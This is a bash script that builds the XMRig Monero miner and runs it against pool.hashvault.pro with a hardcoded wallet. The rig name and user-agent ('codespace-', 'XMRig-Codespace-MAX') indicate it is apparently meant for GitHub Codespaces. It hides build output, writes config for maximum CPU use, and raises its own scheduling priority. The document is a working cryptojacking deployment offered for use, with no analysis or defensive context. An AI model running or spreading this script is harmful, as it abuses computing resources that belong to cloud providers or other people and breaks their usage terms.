#!/bin/bash
set -e

CPU_CORES=$(nproc)

echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null
echo always | sudo tee /sys/kernel/mm/transparent_hugepage/defrag > /dev/null

MEMTOTAL_KB=$(awk '/^MemTotal:/ {print $2}' /proc/meminfo)
RESERVE_KB=2097152
AVAILABLE_KB=$((MEMTOTAL_KB > RESERVE_KB ? MEMTOTAL_KB - RESERVE_KB : 0))
HUGEPAGES=$((AVAILABLE_KB / 2048))
echo $HUGEPAGES | sudo tee /proc/sys/vm/nr_hugepages > /dev/null

RIG_NAME="codespace-$(hostname)-$(date +%s)"

sudo apt update -y > /dev/null 2>&1
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1

cd ~
[ ! -d "xmrig" ] && git clone https://github.com/xmrig/xmrig.git > /dev/null 2>&1
cd xmrig
mkdir -p build && cd build

cmake .. \
  -DWITH_HWLOC=ON \
  -DWITH_CN_GHOUL=OFF \
  -DWITH_OPENCL=OFF \
  -DWITH_CUDA=OFF \
  -DCMAKE_BUILD_TYPE=Release > /dev/null

make -j$CPU_CORES > /dev/null

WALLET="42X98aXKvRm1H5CuJFMJP4XNvXPMLephkdF6yebtkJdja1UfnUKz2eaMqpNG2j81p9cVHubpQNuxHXSiFTPL85Jp8ByFcAY"

cat > config.json <<EOL
{
  "autosave": true,
  "background": false,
  "colors": true,
  "randomx": {
    "init": -1,
    "mode": "fast",
    "1gb-pages": true,
    "numa": true,
    "scratchpad_prefetch_mode": 1
  },
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": true,
    "hw-aes": null,
    "priority": 5,
    "memory-pool": true,
    "max-threads-hint": 100,
    "affinity": -1,
    "asm": true,
    "argon2-impl": "auto",
    "yield": false
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 1,
  "log-file": "xmrig.log",
  "pools": [
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "pool.hashvault.pro:443",
      "user": "$WALLET",
      "pass": "$RIG_NAME",
      "rig-id": null,
      "nicehash": false,
      "keepalive": true,
      "enabled": true,
      "tls": true,
      "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
    }
  ],
  "print-time": 10,
  "retries": 5,
  "retry-pause": 1,
  "user-agent": "XMRig-Codespace-MAX/$CPU_CORES-core",
  "watch": false
}
EOL

sudo renice -n -19 -p $$ 2>/dev/null || true
sudo ionice -c 1 -p $$ 2>/dev/null || true

sleep 2

./xmrig -c config.json
